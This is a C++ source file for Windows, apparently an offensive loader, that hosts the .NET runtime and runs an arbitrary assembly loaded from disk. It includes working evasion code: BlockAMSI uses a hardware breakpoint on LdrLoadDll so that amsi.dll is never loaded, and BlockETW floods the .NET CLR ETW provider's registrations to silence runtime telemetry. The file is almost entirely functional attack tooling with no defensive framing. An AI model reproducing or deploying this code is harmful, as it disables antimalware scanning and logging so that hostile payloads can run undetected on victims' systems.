#include <Windows.h>
#include <winternl.h>
#include <evntprov.h>
#include <metahost.h>
#include <wrl/client.h>
#include <cstdio>

#pragma comment(lib, "MSCorEE.lib")

// Import mscorlib.tlb (Microsoft Common Language Runtime Class Library)
#import <mscorlib.tlb> raw_interfaces_only					\
	high_property_prefixes("_get","_put","_putref")			\
	rename("ReportEvent", "InteropServices_ReportEvent")	\
	rename("or", "InteropServices_or")

#define ArraySize(x) (sizeof x / sizeof x[0])

#define CHECK_HRESULT(hrcall) \
    if (HRESULT hr = hrcall; FAILED(hr)) {                      \
        printf("ERROR: %s failed w/hr 0x%08lx\n", #hrcall, hr); \
        return 1; }

typedef NTSTATUS(NTAPI* LdrLoadDll)(
    IN  PWCHAR          PathToFile OPTIONAL,
    IN  ULONG           Flags OPTIONAL,
    IN  PUNICODE_STRING ModuleFileName,
    OUT PHANDLE         ModuleHandle);

LdrLoadDll fnLdrLoadDll = NULL;

int ExecuteAssembly(SAFEARRAY* rawAssembly, SAFEARRAY* parameters, LPCWCHAR appDomainName) {

    Microsoft::WRL::ComPtr<ICLRMetaHost>    pMetaHost;
    Microsoft::WRL::ComPtr<IEnumUnknown>    pRuntimeEnum;
    Microsoft::WRL::ComPtr<IUnknown>        pUnkown;
    Microsoft::WRL::ComPtr<ICLRRuntimeInfo> pRuntimeInfo;
    Microsoft::WRL::ComPtr<ICLRRuntimeHost> pCLRRuntimeHost;
    Microsoft::WRL::ComPtr<ICorRuntimeHost> pCorRuntimeHost;
    Microsoft::WRL::ComPtr<IUnknown>        pAppDomainThunk;

    mscorlib::_MethodInfoPtr pMethodInfo      = NULL;
    mscorlib::_AppDomainPtr  pCustomAppDomain = NULL;
    mscorlib::_AssemblyPtr   pAssembly        = NULL;

    // Get ICLRMetaHost instance
    CHECK_HRESULT(CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost)));

    CHECK_HRESULT(pMetaHost->EnumerateLoadedRuntimes(GetCurrentProcess(), &pRuntimeEnum));

    // Check if CLR is already loaded.
    BOOL    bCLRLoaded        = FALSE;
    LPCWSTR sz_runtimeVersion = L"v4.0.30319";
    WCHAR   wszVersion[64]    = { 0 };
    DWORD   cchVersion        = ArraySize(wszVersion);
    
    while (pRuntimeEnum->Next(1, &pUnkown, NULL) == S_OK && !bCLRLoaded) {
        if (HRESULT hr = pUnkown.As(&pRuntimeInfo); SUCCEEDED(hr)) {
            if (HRESULT hr = pRuntimeInfo->GetVersionString(wszVersion, &cchVersion); SUCCEEDED(hr)) {
                bCLRLoaded = (lstrcmp(wszVersion, sz_runtimeVersion) == 0);
            }
        }
    }

    if (!bCLRLoaded) {
        // Get the ICLRRuntimeInfo corresponding to a particular CLR version. It 
        // supersedes CorBindToRuntimeEx with STARTUP_LOADER_SAFEMODE.
        CHECK_HRESULT(pMetaHost->GetRuntime(sz_runtimeVersion, IID_PPV_ARGS(&pRuntimeInfo)));


        // Check if the specified runtime can be loaded into the process. This 
        // method will take into account other runtimes that may already be 
        // loaded into the process and set pbLoadable to TRUE if this runtime can 
        // be loaded in an in-process side-by-side fashion. 
        BOOL bLoadable = FALSE;
        CHECK_HRESULT(pRuntimeInfo->IsLoadable(&bLoadable));
        if (!bLoadable) {
            printf("ERROR: The specified runtime can be loaded into the process\n");
            return 1;
        }
    }

    // Get ICLRRuntimeHost instance
    CHECK_HRESULT(pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_PPV_ARGS(&pCLRRuntimeHost)));

    if (!bCLRLoaded) {
        CHECK_HRESULT(pCLRRuntimeHost->Start());
    }

    // Load the CLR into the current process and return a runtime interface 
    // pointer. ICorRuntimeHost and ICLRRuntimeHost are the two CLR hosting  
    // interfaces supported by CLR 4.0.
    CHECK_HRESULT(pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&pCorRuntimeHost)));

    CHECK_HRESULT(pCorRuntimeHost->CreateDomain(appDomainName, NULL, &pAppDomainThunk));

    CHECK_HRESULT(pAppDomainThunk->QueryInterface(IID_PPV_ARGS(&pCustomAppDomain)));

    CHECK_HRESULT(pCustomAppDomain->Load_3(rawAssembly, &pAssembly));

    CHECK_HRESULT(pAssembly->get_EntryPoint(&pMethodInfo));

    VARIANT retVal = { 0 };
    CHECK_HRESULT(pMethodInfo->Invoke_3(VARIANT(), parameters, &retVal));

    CHECK_HRESULT(pCorRuntimeHost->UnloadDomain(pCustomAppDomain));

    return 0;
}

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo) {

    PCWCHAR blockedDLLs[] = {
        L"amsi.dll",
        L"lolz.dll",
    };

    // Check if this is a single-step exception caused by a hardware breakpoint
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Check if the breakpoint was hit for LdrLoadDll
        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == fnLdrLoadDll) {
            // x64 calling convention, 3rd parameter is in R8
            PUNICODE_STRING moduleName = (PUNICODE_STRING)ExceptionInfo->ContextRecord->R8;
            if (moduleName && moduleName->Buffer) {
                for (DWORD i = 0; i < ArraySize(blockedDLLs); i++) {
                    // Performs a case-insensitive comparison of strings
                    if (_wcsicmp(moduleName->Buffer, blockedDLLs[i]) == 0) {
                        // we dont want to load it, so simulate a ret
                        ExceptionInfo->ContextRecord->Rip = *(ULONG_PTR*)ExceptionInfo->ContextRecord->Rsp;
                        ExceptionInfo->ContextRecord->Rsp += sizeof(PVOID);
                        ExceptionInfo->ContextRecord->Rax = STATUS_DLL_NOT_FOUND;
                        wprintf(L"BLOCKED: %wZ\n", moduleName);
                        break;
                    }
                }
            }

            // Set the resume flag before continuing execution
            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL EnableBreakpoint(HANDLE hThread, const PVOID address) {

    CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

    if (!GetThreadContext(hThread, &context)) {
        return FALSE;
    }

    context.Dr0 = (DWORD_PTR)address;
    context.Dr7 |= 1;  // Enable the breakpoint for execution on DR0

    // Set the thread context with the updated debug registers
    if (!SetThreadContext(hThread, &context)) {
        return FALSE;
    }

    return TRUE;
}

BOOL BlockAMSI(void) {
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
    if (!ntdll) return FALSE;

    fnLdrLoadDll = (LdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    if (!fnLdrLoadDll) return FALSE;

    HANDLE hExHandler = AddVectoredExceptionHandler(1, ExceptionHandler);
    return EnableBreakpoint(GetCurrentThread(), fnLdrLoadDll);
}

void BlockETW() {
    REGHANDLE RegistrationHandle = NULL;
    const GUID ProviderGuid = { 0x230d3ce1, 0xbccc, 0x124e, {0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4} }; //.NET Common Language Runtime
    while (EventRegister(&ProviderGuid, NULL, NULL, &RegistrationHandle) == ERROR_SUCCESS) {}
}

int wmain(int argc, wchar_t** argv) {

    if (argc < 2) {
        wprintf(L"%s AssemblyPath Arguments...\n", argv[0]);
        return 0;
    }

    LPCWCHAR appDomainName = L"TEST";
    LPCWCHAR assemblyPath  = argv[1];

    HANDLE hFile = CreateFileW(assemblyPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"CreateFileW ERROR: %ul\n", GetLastError());
        return 1;
    }

    LARGE_INTEGER fileSize = { 0 };
    GetFileSizeEx(hFile, &fileSize);

    SAFEARRAYBOUND bounds[1];
    bounds[0].cElements = static_cast<ULONG>(fileSize.QuadPart);
    bounds[0].lLbound = 0;

    SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, bounds);

    void* pvData = NULL;
    CHECK_HRESULT(SafeArrayAccessData(pSafeArray, &pvData));

    DWORD dwBytesRead = 0;
    if (ReadFile(hFile, pvData, static_cast<DWORD>(fileSize.QuadPart), &dwBytesRead, NULL) == FALSE || dwBytesRead != fileSize.QuadPart) {
        wprintf(L"ReadFile ERROR: %ul\n", GetLastError());
        return 1;
    }

    CHECK_HRESULT(SafeArrayUnaccessData(pSafeArray));

    CloseHandle(hFile);

    // EntryPoint.Invoke(new string[] { argv_1, argv_2, argv_3, ... } )

    VARIANT vtPsa  = { 0 };
    vtPsa.vt = (VT_ARRAY | VT_BSTR);
    vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc - 2);
    for (LONG i = 0; i < argc - 2; i++) {
        SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(argv[i + 2]));
    }
    SAFEARRAY* params = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    LONG idx = 0;
    SafeArrayPutElement(params, &idx, &vtPsa);

    BlockAMSI();
    BlockETW();

    ExecuteAssembly(pSafeArray, params, appDomainName);
    return 0;
}
